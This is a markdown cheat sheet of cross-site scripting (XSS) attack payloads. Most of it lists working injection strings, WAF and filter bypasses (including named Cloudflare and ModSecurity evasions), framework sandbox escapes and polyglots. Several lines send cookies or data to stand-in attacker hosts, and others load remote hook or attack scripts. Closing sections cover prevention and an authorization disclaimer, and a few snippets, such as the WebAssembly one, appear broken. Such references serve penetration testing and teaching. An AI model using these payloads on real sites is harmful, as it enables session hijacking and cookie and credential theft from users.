# 🛡️ **CROSS-SITE SCRIPTING (XSS) - ULTIMATE CHEAT SHEET**

## 📋 **TABLE OF CONTENTS**
1. [Introduction & Types](#introduction)
2. [Detection Methodology](#detection)
3. [Basic Payloads](#basic-payloads)
4. [Event Handlers](#event-handlers)
5. [Bypass Techniques](#bypass)
6. [WAF Evasion](#waf-evasion)
7. [Advanced Exploitation](#advanced)
8. [DOM XSS](#dom-xss)
9. [Framework-Specific Attacks](#frameworks)
10. [Polyglot Payloads](#polyglots)
11. [Tools](#tools)
12. [Real-World Examples](#real-world)
13. [Prevention](#prevention)
14. [References](#references)

---

## 1️⃣ **INTRODUCTION** <a name="introduction"></a>

### **What is XSS?**
Cross-Site Scripting (XSS) occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing execution of malicious scripts [[8]].

### **Impact** 🔥
- **Session Hijacking** - Steal cookies and session tokens
- **Credential Theft** - Keylogging and fake login forms
- **Defacement** - Modify page content
- **Malware Distribution** - Drive-by downloads
- **Browser Exploitation** - Exploit browser vulnerabilities
- **CSRF Token Theft** - Bypass CSRF protections
- **Actions on Behalf of User** - Perform authenticated actions

### **Types of XSS**

#### **1. Reflected XSS**
Malicious script comes from the current HTTP request
```
GET /search?q=<script>alert(1)</script> HTTP/1.1
Host: vulnerable.com
```

#### **2. Stored XSS**
Malicious script is stored in database and served to victims
```
POST /comment HTTP/1.1
Host: vulnerable.com

comment=<script>stealCookies()</script>
```

#### **3. DOM XSS**
Vulnerability exists in client-side code rather than server-side [[29]][[30]]
```javascript
// Vulnerable code
document.write(location.hash.substring(1));
```

---

## 2️⃣ **DETECTION METHODOLOGY** <a name="detection"></a>

### **Reconnaissance Checklist**
```
✓ Identify all input vectors (GET, POST, headers, cookies)
✓ Test for reflection in HTML context
✓ Check for reflection in JavaScript context
✓ Test event handlers and attributes
✓ Analyze Content Security Policy (CSP)
✓ Test for DOM sinks (innerHTML, document.write, eval)
✓ Check for framework-specific vulnerabilities
```

### **Basic Tests**
```html
<!-- Test 1: Basic script injection -->
<script>alert(1)</script>

<!-- Test 2: Image error handler -->
<img src=x onerror=alert(1)>

<!-- Test 3: SVG injection -->
<svg onload=alert(1)>

<!-- Test 4: Body onload -->
<body onload=alert(1)>

<!-- Test 5: Iframe injection -->
<iframe src="javascript:alert(1)">
```

### **Context Detection**
```html
<!-- HTML Context -->
<div>YOUR_INPUT</div>
Test: <script>alert(1)</script>

<!-- Attribute Context -->
<input value="YOUR_INPUT">
Test: "><script>alert(1)</script>

<!-- JavaScript Context -->
<script>var x = 'YOUR_INPUT';</script>
Test: ';alert(1);//

<!-- URL Context -->
<a href="YOUR_INPUT">Click</a>
Test: javascript:alert(1)
```

---

## 3️⃣ **BASIC PAYLOADS** <a name="basic-payloads"></a>

### **Classic Vectors**

#### **Script Tag**
```html
<script>alert('XSS')</script>
<script src=https://xss.rocks/xss.js></script>
<SCRIPT SRC=https://cdn.jsdelivr.net/gh/Moksh45/host-xss.rocks/index.js></SCRIPT>
```

#### **Image Tag**
```html
<img src=x onerror=alert(1)>
<img src="x:x" onerror="alert(XSS)">
<img src=1 onerror=alert(document.domain)>
<img """><script>alert("XSS")</script>">
```

#### **SVG Injection**
```html
<svg onload=alert(1)>
<svg/onload=alert('XSS')>
<svg><script>alert(1)</script>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
```

#### **Body Tag**
```html
<body onload=alert(1)>
<body background="javascript:alert(1)">
<body onpageshow=alert(1)>
```

#### **Iframe**
```html
<iframe src="javascript:alert(1)">
<iframe src="data:text/html,<script>alert(1)</script>">
<iframe srcdoc="<script>alert(1)</script>">
```

### **Event Handler Payloads**

#### **Mouse Events**
```html
<div onmouseover=alert(1)>Hover me</div>
<div onclick=alert(1)>Click me</div>
<div onmousedown=alert(1)>Press</div>
```

#### **Focus Events**
```html
<input autofocus onfocus=alert(1)>
<input onfocusin=alert(1)>
<marquee onstart=alert(1)>
```

#### **Media Events**
```html
<video><source onerror="alert(1)"></video>
<audio src=x onerror=alert(1)>
<video oncanplay=alert(1)><source src="validvideo.mp4"></video>
```

#### **Form Events**
```html
<input onchange=alert(1) value=xss>
<form><button formaction=javascript:alert(1)>Click
<select onchange=alert(1)><option>1</option></select>
```

---

## 4️⃣ **EVENT HANDLERS** <a name="event-handlers"></a>

### **No User Interaction Required** [[25]]

#### **Animation Events**
```html
<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationend="alert(1)"></xss>

<style>@keyframes slidein {}</style>
<xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" 
onanimationiteration="alert(1)"></xss>

<style>@keyframes x{}</style>
<xss style="animation-name:x" onanimationstart="alert(1)"></xss>
```

#### **Transition Events**
```html
<style>:target {color:red;}</style>
<xss id=x style="transition:color 1s" ontransitionstart=alert(1)></xss>

<xss id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></xss>
```

#### **Content Visibility**
```html
<xss oncontentvisibilityautostatechange=alert(1) 
style=display:block;content-visibility:auto>
```

#### **Scroll Events**
```html
<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>

<xss onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;">
<br><br><span id=x>test</span></xss>
```

#### **Error Events**
```html
<audio src/onerror=alert(1)>
<body onerror=alert(1)>
<img src=x onerror=alert(1)>
<link href=x onerror=alert(1)>
<object data=x onerror=alert(1)>
<script onerror=alert(1)></script>
<video><source onerror=alert(1)>
```

### **User Interaction Required** [[25]]

#### **Click Events**
```html
<xss onclick="alert(1)" style=display:block>test</xss>
<a onauxclick=alert(1)>Right click me</a>
```

#### **Context Menu**
```html
<xss oncontextmenu="alert(1)" style=display:block>Right click</xss>
```

#### **Drag Events**
```html
<div draggable=true ondragstart=alert(1)>Drag me</div>
```

#### **Copy/Paste Events**
```html
<a onbeforecopy="alert(1)" contenteditable>Copy this</a>
<a onbeforecut="alert(1)" contenteditable>Cut this</a>
<xss onbeforepaste=alert(1)>Paste here</xss>
```

#### **Toggle Events**
```html
<details ontoggle=alert(1) open>test</details>
```

---

## 5️⃣ **BYPASS TECHNIQUES** <a name="bypass"></a>

### **Case Manipulation**
```html
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
<svg ONLOAD=alert(1)>
```

### **Character Insertion**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
```

### **Encoding Techniques**

#### **URL Encoding**
```html
%3Cscript%3Ealert(1)%3C/script%3E
%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
```

#### **HTML Entities**
```html
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
```

#### **Unicode Encoding**
```html
\u003cscript\u003ealert(1)\u003c/script\u003e
\x3cscript\x3ealert(1)\x3c/script\x3e
```

#### **Base64 Encoding**
```html
<script>alert(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### **Null Bytes & Special Characters**
```html
<scr%00ipt>alert(1)</scr%00ipt>
<scr%00ipt>alert(1)</scr%00ipt>
<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
```

### **Non-Alpha-Non-Digit**
```html
<SCRIPT/XSS SRC="http://xss.rocks/xss.js"></SCRIPT>
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert("XSS")>
```

### **Protocol Bypass**
```html
<a href="//www.google.com/">XSS</a>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

### **JavaScript Protocol Variations**
```html
<a href="javascript:alert(1)">XSS</a>
<a href="javascript&#x6a;avascript:alert(1)">Firefox</a>
<a href="javascript&colon;alert(1)">Firefox</a>
<a href="javascript://%0aalert(1)">XSS</a>
```

### **FromCharCode**
```html
<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

---

## 6️⃣ **WAF EVASION** <a name="waf-evasion"></a>

### **Common WAF Bypass Strings** [[25]][[44]]

```html
<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">
<Video><source onerror = "javascript: alert(XSS)">
<applet code="javascript:confirm(document.cookie);">
<isindex x="javascript:" onmouseover="alert(XSS)">
"></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
<iframe/src="data:text/html,<svg onload=alert(1)>">
<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>
<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">
<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>
<form><a href="javascript:\u0061lert(1)">X
</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>
```

### **Cloudflare Bypass**
```html
<svg/onload=alert(1)>
<body onload=alert(1)>
<marquee onstart=alert(1)>
<details ontoggle=alert(1) open>test</details>
```

### **ModSecurity Bypass**
```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<xss oncontentvisibilityautostatechange=alert(1) style=content-visibility:auto>
<details ontoggle="alert(1)" open>test</details>
```

### **Filter Evasion Techniques** [[24]][[41]]

#### **Double Encoding**
```html
%253Cscript%253Ealert(1)%253C/script%253E
```

#### **UTF-7 Encoding**
```html
+ADw-script+AD4-alert(1)+ADw-/script+AD4-
```

#### **UTF-16 Encoding**
```html
%00%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00(
```

#### **Overlong UTF-8**
```html
%c0%bcscript%c0%bealert(1)%c0%bc/script%c0%be
```

### **Character Replacement**
```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg><script>alert(1)</script>
```

---

## 7️⃣ **ADVANCED EXPLOITATION** <a name="advanced"></a>

### **XSS via Redirection** [[45]]
```
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=>
```

### **Reflected XSS in JavaScript** [[45]]
```javascript
// Vulnerable code
<script> ... setTimeout("writetitle()",$\_GET[xss]) ... </script>

// Exploitation
/?xss=500); alert(document.cookie);//
```

### **DOM-based XSS** [[45]]
```javascript
// Vulnerable code
<script> ... eval($\_GET[xss]); ... </script>

// Exploitation
/?xss=document.cookie
```

### **Prototype Pollution to XSS**
```javascript
// Pollute prototype
?__proto__[script]=alert(1)

// Or via JSON
{"__proto__":{"script":"alert(1)"}}
```

### **Mutation XSS (mXSS)**
```html
<div id=x><img src=x onerror=alert(1)></div>
<script>
var x = document.getElementById('x');
x.innerHTML = x.innerHTML;
</script>
```

### **CSS Injection to XSS**
```html
<style>
div[role="button"] {
  background: url('http://attacker.com/?steal=' attr(data-value));
}
</style>
<div role="button" data-value="secret">Click</div>
```

### **Service Worker XSS**
```javascript
// Register malicious service worker
navigator.serviceWorker.register('/sw.js');

// sw.js
self.addEventListener('fetch', event => {
  event.respondWith(new Response('<script>alert(1)</script>', {
    headers: {'Content-Type': 'text/html'}
  }));
});
```

### **Web Assembly XSS**
```html
<script>
var wasmCode = new Uint8Array([0,97,115,109,1,0,0,0]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule);
eval(String.fromCharCode.apply(null, wasmModule.exports.memory.buffer));
</script>
```

---

## 8️⃣ **DOM XSS** <a name="dom-xss"></a>

### **Dangerous Sinks** [[34]][[36]]

#### **innerHTML**
```javascript
// Vulnerable
element.innerHTML = location.hash.substring(1);

// Exploit
#<img src=x onerror=alert(1)>
```

#### **document.write**
```javascript
// Vulnerable
document.write(location.search.substring(1));

// Exploit
?<script>alert(1)</script>
```

#### **eval**
```javascript
// Vulnerable
eval(location.hash.substring(1));

// Exploit
#alert(1)
```

#### **setTimeout/setInterval**
```javascript
// Vulnerable
setTimeout(location.hash.substring(1), 1000);

// Exploit
#alert(1)
```

#### **document.createElement + insertAdjacentHTML**
```javascript
// Vulnerable
var div = document.createElement('div');
div.insertAdjacentHTML('beforeend', userInput);

// Exploit
<img src=x onerror=alert(1)>
```

### **DOM XSS Sources**
```javascript
// Dangerous sources
location.hash
location.search
location.pathname
document.URL
document.documentURI
document.referrer
window.name
message event data
```

### **Real DOM XSS Example**
```html
<script>
function loadProfile() {
  var userId = location.hash.substring(1);
  document.getElementById('profile').innerHTML = 
    '<img src="/profiles/' + userId + '.jpg">';
}
loadProfile();
</script>

<!-- Exploit -->
#<img src=x onerror=alert(1)>.jpg
```

---

## 9️⃣ **FRAMEWORK-SPECIFIC ATTACKS** <a name="frameworks"></a>

### **AngularJS Sandbox Escapes** [[25]]

#### **Basic Escape**
```javascript
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

#### **CSP Bypass**
```javascript
{{[].pop.constructor('alert(1)')()}}
{{$eval('alert(1)')}}
```

### **Vue.js Template Injection**
```javascript
{{constructor.constructor('alert(1)')()}}
{{$el.constructor('alert(1)')()}}
```

### **React XSS**
```javascript
// Dangerous: dangerouslySetInnerHTML
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Exploit via props
<Component {...JSON.parse(location.hash.substring(1))} />
```

### **jQuery Prototype Pollution**
```javascript
// Pollute via URL
?__proto__[on]=alert(1)

// Trigger
$(element).trigger('on')
```

### **Svelte XSS**
```svelte
<!-- Vulnerable -->
{@html userInput}

<!-- Exploit -->
<img src=x onerror=alert(1)>
```

### **Backbone/Marionette**
```javascript
// Prototype pollution
<script>
Object.prototype.template = '<img src=x onerror=alert(1)>';
</script>
```

### **Knockout.js**
```html
<strong data-bind="text:'hello'"></strong>
<script>
Object.prototype[4]="a':1,[alert(1)]:1,'b";
Object.prototype[5]=',';
ko.applyBindings({});
</script>
```

---

## 🔟 **POLYGLOT PAYLOADS** <a name="polyglots"></a>

### **What are Polyglots?**
Polyglot XSS payloads work in multiple contexts simultaneously (HTML, attribute, JavaScript, URL) [[5]].

### **Universal Polyglots**

#### **JaSOn Polyglot**
```javascript
javascript://'/</title></style></textarea></script>--><p" onclick=alert(1)//>*/alert()/*
```

#### **Comprehensive Polyglot**
```javascript
-->'"/></sCriPt><svG x=">" onload=(confirm)()>
```

#### **Multi-Context Polyglot**
```javascript
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

#### **Simple Polyglot**
```javascript
"><img src=x onerror=alert(1)><!--'`"><script>alert(1)</script>
```

### **Framework Polyglots**

#### **Angular + HTML**
```javascript
{{constructor.constructor('alert(1)')()}}<img src=x onerror=alert(1)>
```

#### **Vue + HTML**
```javascript
{{$el.constructor('alert(1)')()}}<svg onload=alert(1)>
```

---

## 1️⃣1️⃣ **TOOLS** <a name="tools"></a>

### **Automated Scanners**
```bash
# XSStrike
git clone https://github.com/s0md3v/XSStrike
python3 xsstrike.py -u "http://target.com/search?q=test"

# Dalfox
go get github.com/hahwul/dalfox
dalfox url http://target.com/search?q=test

# XSpear
gem install XSpear
XSpear -u "http://target.com/search?q=test"

# XSSER
xsser --url "http://target.com" -p "q=test"
```

### **Browser Extensions**
- **Hack-Tools** - All-in-one XSS payload generator
- **XSS Payload Generator** - Context-aware payloads
- **Wappalyzer** - Detect frameworks
- **Cookie Editor** - Manipulate cookies for testing

### **Proxy Tools**
- **Burp Suite Professional** - Active scanner for XSS
- **OWASP ZAP** - Open-source scanner
- **mitmproxy** - Intercept and modify requests

### **Payload Generators**
```bash
# PayloadsAllTheThings
git clone https://github.com/swisskyrepo/PayloadsAllTheThings

# XSS Payload List
git clone https://github.com/payload-box/xss-payload-list

# PortSwigger XSS Cheat Sheet
# https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
```

### **Testing Tools**
```javascript
// XSS Hunter
<script src="https://xss hunter example.com/xss.js"></script>

// BeEF Framework
<script src="http://attacker:3000/hook.js"></script>
```

---

## 1️⃣2️⃣ **REAL-WORLD EXAMPLES** <a name="real-world"></a>

### **Bug Bounty Examples**

#### **Example 1: Reflected XSS in Search**
```
GET /search?q=<svg onload=alert(document.domain)> HTTP/1.1
Host: vulnerable-site.com

Response reflects query parameter without sanitization
```

#### **Example 2: Stored XSS in Profile**
```
POST /api/profile/update HTTP/1.1
{
  "bio": "<script>fetch('http://attacker.com/steal?c='+document.cookie)</script>"
}

Stored in database, executes when admin views profile
```

#### **Example 3: DOM XSS in Router**
```javascript
// Vulnerable Angular route
$routeProvider.when('/user/:id', {
  template: '<div ng-bind-html="userBio"></div>'
});

// Exploit
#/user/123?bio=<img src=x onerror=alert(1)>
```

#### **Example 4: Blind XSS**
```
User-Agent: <script src=http://xss hunter.com/hook.js></script>
Referer: <img src=x onerror=alert(document.domain)>

Triggers in admin panel when viewing logs
```

### **Common Vulnerable Patterns**

#### **Pattern 1: Unsafe innerHTML**
```javascript
// Vulnerable
element.innerHTML = userInput;

// Fix
element.textContent = userInput;
```

#### **Pattern 2: Unsafe eval**
```javascript
// Vulnerable
eval(userInput);

// Fix
JSON.parse(userInput);
```

#### **Pattern 3: Unsafe document.write**
```javascript
// Vulnerable
document.write(location.hash.substring(1));

// Fix
document.createElement('div').textContent = ...;
```

---

## 1️⃣3️⃣ **PREVENTION** <a name="prevention"></a>

### **Output Encoding**

#### **HTML Entity Encoding**
```python
# Python
import html
html.escape(user_input)

# JavaScript
function htmlEscape(str) {
  return str.replace(/&/g, '&amp;')
             .replace(/</g, '&lt;')
             .replace(/>/g, '&gt;')
             .replace(/"/g, '&quot;')
             .replace(/'/g, '&#x27;');
}
```

#### **Attribute Encoding**
```javascript
// Always quote attributes
<div title="<%= user_input.replace(/"/g, '&quot;') %>">

// Or use single quotes
<div title='<%= user_input.replace(/'/g, '&#x27;') %>'>
```

#### **JavaScript Encoding**
```javascript
// Escape for JavaScript context
function jsEscape(str) {
  return str.replace(/\\/g, '\\\\')
            .replace(/'/g, "\\'")
            .replace(/"/g, '\\"')
            .replace(/</g, '\\x3C')
            .replace(/>/g, '\\x3E');
}
```

#### **URL Encoding**
```javascript
// For URL parameters
encodeURIComponent(userInput)

// For full URLs
encodeURI(fullUrl)
```

### **Content Security Policy (CSP)**

#### **Strict CSP**
```http
Content-Security-Policy: default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
```

#### **CSP with Nonce**
```http
Content-Security-Policy: script-src 'nonce-abc123' 'strict-dynamic'
```

```html
<script nonce="abc123">
  // Safe scripts only
</script>
```

### **Input Validation**

#### **Whitelist Approach**
```javascript
// Only allow specific characters
function sanitizeInput(input) {
  return input.replace(/[^a-zA-Z0-9\s-]/g, '');
}
```

#### **Length Validation**
```javascript
if (userInput.length > 1000) {
  throw new Error('Input too long');
}
```

### **Safe JavaScript Practices**

#### **Use textContent instead of innerHTML**
```javascript
// ❌ Dangerous
element.innerHTML = userInput;

// ✅ Safe
element.textContent = userInput;
```

#### **Use createElement and setAttribute**
```javascript
// ❌ Dangerous
div.innerHTML = '<a href="' + url + '">link</a>';

// ✅ Safe
var a = document.createElement('a');
a.href = url;
a.textContent = 'link';
div.appendChild(a);
```

#### **Avoid eval**
```javascript
// ❌ Dangerous
eval(userInput);

// ✅ Safe
JSON.parse(userInput);
```

### **Framework-Specific Protections**

#### **React**
```javascript
// React auto-escapes by default
<div>{userInput}</div> // Safe

// Dangerous - avoid unless necessary
<div dangerouslySetInnerHTML={{__html: sanitizedInput}} />
```

#### **Angular**
```typescript
// Angular sanitizes by default
<div [innerHTML]="userInput"></div> // Sanitized

// Bypass only if trusted
<div [innerHTML]="bypassSecurityTrustHtml(trustedInput)"></div>
```

#### **Vue.js**
```vue
<!-- Auto-escaped -->
<div>{{ userInput }}</div>

<!-- Dangerous - use v-text instead -->
<div v-html="userInput"></div>
```

---

## 1️⃣4️ **REFERENCES** <a name="references"></a>

### **Official Documentation**
- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) [[24]][[45]]
- [PortSwigger XSS Academy](https://portswigger.net/web-security/cross-site-scripting) [[25]]
- [MDN XSS Guide](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)

### **Tools & Resources**
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection) [[4]]
- [XSS Payload List](https://github.com/payload-box/xss-payload-list) [[8]]
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) [[25]]
- [XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter)

### **Recent Research**
- [XSS in 2025 - Payloads That Still Work](https://santhosh-adiga-u.medium.com/xss-in-2025-the-payloads-that-still-work-3aa343e0b4f2) [[2]]
- [Top 10 XSS Payloads 2025](https://osintteam.blog/top-10-xss-payloads-that-still-work-in-2025-9c258842caa2) [[3]]
- [Advanced XSS Bypass Techniques](https://medium.com/@asifebrahim580/advanced-xss-exploitation-bypassing-modern-filters-and-wafs-3da167aba515) [[46]]

### **Practice Labs**
- [PortSwigger XSS Labs](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Game by Google](https://xss-game.appspot.com/)
- [HackTheBox XSS Challenges](https://www.hackthebox.com)
- [TryHackMe XSS Rooms](https://tryhackme.com)

---

## **📝 QUICK REFERENCE CARD**

### **Top 10 Payloads**
```html
1. <script>alert(1)</script>
2. <img src=x onerror=alert(1)>
3. <svg onload=alert(1)>
4. <body onload=alert(1)>
5. <iframe src="javascript:alert(1)">
6. <details ontoggle=alert(1) open>test</details>
7. <marquee onstart=alert(1)>XSS</marquee>
8. <input onfocus=alert(1) autofocus>
9. <video><source onerror="alert(1)">
10. javascript:alert(1)
```

### **Context-Specific Payloads**
```html
HTML: <script>alert(1)</script>
Attribute: "><script>alert(1)</script>
JavaScript: ';alert(1);//
URL: javascript:alert(1)
CSS: </style><script>alert(1)</script>
```

### **Bypass Checklist**
```
✓ Try different cases (upper/lower)
✓ Add null bytes (%00)
✓ URL encode special chars
✓ HTML entity encode
✓ Use alternative tags/events
✓ Test protocol handlers
✓ Check for reflection
✓ Analyze CSP headers
✓ Test DOM sinks
```

---

## **⚠️ ETHICAL DISCLAIMER**

> This cheat sheet is for **educational and authorized security testing purposes only**. Always:
> - Obtain proper written authorization before testing
> - Follow responsible disclosure practices
> - Comply with all applicable laws and regulations
> - Never test systems you don't own or have explicit permission to test
> - Report vulnerabilities responsibly to affected organizations

